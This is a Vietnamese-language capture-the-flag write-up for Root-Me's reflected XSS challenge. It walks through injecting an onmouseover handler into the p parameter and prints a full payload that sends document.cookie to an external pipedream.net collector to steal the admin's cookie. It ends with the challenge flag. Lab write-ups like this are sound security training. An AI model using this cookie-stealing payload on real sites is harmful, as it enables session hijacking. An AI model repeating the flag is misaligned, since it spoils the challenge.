# WRITE UP

## **Challenge: [XSS Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)**

Kiểm tra source website ta thấy web bị comment 1 thẻ \<a\> dẫn đến ?p=security:

![Text Description automatically generated](./media/image1.png){width="6.5in" height="2.8986111111111112in"}

Request đến ?p=security, website hiển thị trang web lỗi và có một hyperlink thẻ \<a\> hiển thị nội dung 'security':

![Graphical user interface, text, application Description automatically generated](./media/image2.png){width="6.5in" height="3.0340277777777778in"}

Thử nhập ?p=\<giá trị khác\>, page sẽ báo lỗi và hiển thị nội dung \<giá trị khác\> trong thẻ \<a\>. Như vậy, lợi dụng thẻ \<a\> này, ta thực hiện đóng quote cũng như chèn thêm event để thực hiện XSS:

![Graphical user interface, text, application Description automatically generated](./media/image3.png){width="6.5in" height="2.2625in"}

Đến đây, sau khi thử get trực tiếp document.cookie nhưng không có giá trị, ta thực hiện gửi HTTP Request và qua RequestBin chờ cookie.

Payload: <http://challenge01.root-me.org/web-client/ch26/?p=nh4ttruong%27%20onmouseover=%27document.location=%22https://eol9dtzbk9673pb.m.pipedream.net?%22.concat(document.cookie)>

Thực hiện request với payload, sau đó ta trigger event 'onmouseover' và di chuyển chuột qua thẻ \<a\> để chuyển hướng website:

![Graphical user interface, application Description automatically generated](./media/image4.png){width="6.5in" height="1.0395833333333333in"}

Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:

![Graphical user interface, text, application, email Description automatically generated](./media/image5.png){width="5.2193547681539805in" height="2.0922025371828523in"}

![Graphical user interface, text Description automatically generated](./media/image6.png){width="6.5in" height="1.8604166666666666in"}

Qua RequestBin và nhận flag:

![Graphical user interface, text, application Description automatically generated](./media/image7.png){width="6.5in" height="1.9493055555555556in"}

**Flag:** r3fL3ct3D_XsS_fTw
